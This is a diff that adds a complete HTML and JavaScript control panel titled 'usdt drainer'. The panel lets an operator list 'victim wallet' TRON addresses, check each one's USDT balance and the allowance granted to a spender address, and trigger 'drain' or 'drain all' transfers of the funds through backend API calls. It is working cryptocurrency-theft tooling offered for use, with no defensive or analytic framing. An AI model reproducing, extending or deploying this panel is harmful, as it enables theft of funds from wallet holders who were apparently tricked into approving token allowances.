@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>drainer</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#0c0e13;color:#d7dae1;font:14px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;padding:16px}
+h1{font-size:15px;letter-spacing:1px;color:#6ee7a8;margin-bottom:12px;text-transform:uppercase}
+.bar{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px;align-items:center}
+input,button{font:inherit;background:#161a22;color:#d7dae1;border:1px solid #252b36;border-radius:6px;padding:8px 10px}
+input:focus{outline:1px solid #3b82f6}
+button{cursor:pointer}
+button:hover{background:#1e2530}
+.b{background:#1d4ed8;border-color:#1d4ed8;color:#fff}
+.b:hover{background:#2563eb}
+.g{background:#14532d;border-color:#166534;color:#86efac}
+.r{background:#4c1d1d;border-color:#7f1d1d;color:#fca5a5}
+table{width:100%;border-collapse:collapse;font-size:12.5px}
+th,td{text-align:left;padding:7px 8px;border-bottom:1px solid #1c222c;white-space:nowrap}
+th{color:#7d8798;font-weight:400;font-size:11px;text-transform:uppercase;letter-spacing:.5px}
+tr:hover td{background:#12161d}
+a{color:#60a5fa;text-decoration:none}
+.st{padding:1px 6px;border-radius:4px;font-size:11px}
+.ok{background:#14532d;color:#86efac}
+.no{background:#3f1d1d;color:#fca5a5}
+.warn{background:#422006;color:#fcd34d}
+.dim{color:#6b7484}
+#msg{font-size:12px;margin-bottom:10px;min-height:16px}
+#sum{font-size:12px;color:#9aa4b2;margin-bottom:10px}
+#sum b{color:#6ee7a8}
+</style></head><body>
+
+<h1>usdt drainer</h1>
+
+<div class="bar">
+  <input id="tok" placeholder="dashboard token" size="26">
+  <button class="b" onclick="boot()">load</button>
+  <input id="addr" placeholder="T... victim wallet" size="38">
+  <button onclick="add()">+ add</button>
+  <button class="g" onclick="checkAll()">recheck all</button>
+  <button class="r" onclick="drainAll()">drain all</button>
+</div>
+
+<div id="msg"></div>
+<div id="sum"></div>
+
+<table>
+  <thead><tr>
+    <th>wallet</th><th>balance</th><th>allowance</th><th>state</th><th>checked</th><th></th>
+  </tr></thead>
+  <tbody id="tb"></tbody>
+</table>
+
+<script>
+const $ = s => document.querySelector(s);
+const tok = () => $('#tok').value.trim();
+let timer;
+
+$('#tok').value = localStorage.getItem('dtok') || '';
+$('#tok').oninput = () => localStorage.setItem('dtok', tok());
+
+const api = (p, o = {}) => fetch(p, {
+  ...o,
+  headers: { 'Content-Type': 'application/json', 'x-token': tok(), ...(o.headers || {}) }
+}).then(async r => {
+  const j = await r.json().catch(() => ({}));
+  if (!r.ok) throw new Error(j.error || r.status);
+  return j;
+});
+
+const say = (t, bad) => { $('#msg').innerHTML = `<span class="${bad?'r':'dim'}">${t}</span>`; };
+const f = u => (Number(u)/1e6).toFixed(4);
+const cut = a => a.slice(0,6)+'…'+a.slice(-6);
+
+function row(r) {
+  const bal = Number(r.balance), al = Number(r.allowance);
+  let st = '<span class="st no">empty</span>';
+  if (r.error) st = '<span class="st warn">error</span>';
+  else if (bal > 0 && al === 0) st = '<span class="st no">no allow</span>';
+  else if (bal > 0 && al >= bal) st = '<span class="st ok">ready</span>';
+  else if (bal > 0) st = '<span class="st warn">partial</span>';
+
+  return `<tr>
+    <td><a href="https://tronscan.org/#/address/${r.addr}" target="_blank">${cut(r.addr)}</a>
+        <span class="dim">${r.note||''}</span></td>
+    <td>${f(r.balance)}</td>
+    <td>${al > 1e12 ? '∞' : f(r.allowance)}</td>
+    <td>${st}</td>
+    <td class="dim">${r.checked ? new Date(r.checked).toLocaleTimeString() : '—'}</td>
+    <td>
+      <button class="g" onclick="drain('${r.addr}')">drain</button>
+      <button onclick="del('${r.addr}')">×</button>
+    </td>
+  </tr>`;
+}
+
+async function load() {
+  try {
+    const s = await api('/api/state');
+    $('#sum').innerHTML =
+      `spender <a href="https://tronscan.org/#/address/${s.spender}" target="_blank">${cut(s.spender)}</a>
+       · trx <b>${s.trx}</b>${s.trx < s.minTrx ? ' <span class="st no">low</span>' : ''}
+       · tracked <b>${s.count}</b> · usdt <b>${f(s.totalBal)}</b>`;
+    $('#tb').innerHTML = s.rows.map(row).join('') || '<tr><td colspan="6" class="dim">kuch nahi</td></tr>';
+    say('');
+  } catch (e) { say('load fail: ' + e.message, true); }
+}
+
+async function add() {
+  const addr = $('#addr').value.trim();
+  if (!addr) return;
+  try { await api('/api/victims', { method:'POST', body: JSON.stringify({ addr }) });
+        $('#addr').value = ''; load(); }
+  catch (e) { say('add fail: ' + e.message, true); }
+}
+
+async function del(a) {
+  if (!confirm('remove ' + a + '?')) return;
+  try { await api('/api/victims/' + a, { method:'DELETE' }); load(); }
+  catch (e) { say(e.message, true); }
+}
+
+async function checkAll() {
+  say('checking…');
+  try { await api('/api/check', { method:'POST' }); load(); }
+  catch (e) { say(e.message, true); }
+}
+
+async function drain(a) {
+  const amt = prompt('amount in USDT (blank = poora available)', '');
+  if (amt === null) return;
+  say('draining ' + cut(a) + '…');
+  try {
+    const r = await api('/api/drain/' + a, { method:'POST', body: JSON.stringify({ amount: amt.trim() }) });
+    say(`ok ${r.amount} USDT · ${r.txid}`);
+    load();
+  } catch (e) { say('fail: ' + e.message, true); }
+}
+
+async function drainAll() {
+  if (!confirm('sab ready wallets drain karein?')) return;
+  say('drain all chalu…');
+  try {
+    const r = await api('/api/drain-all', { method:'POST' });
+    say('done: ' + JSON.stringify(r.out));
+    load();
+  } catch (e) { say(e.message, true); }
+}
+
+function boot() { load(); clearInterval(timer); timer = setInterval(load, 20000); }
+if ($('#tok').value) boot();
+</script>
+</body></html>
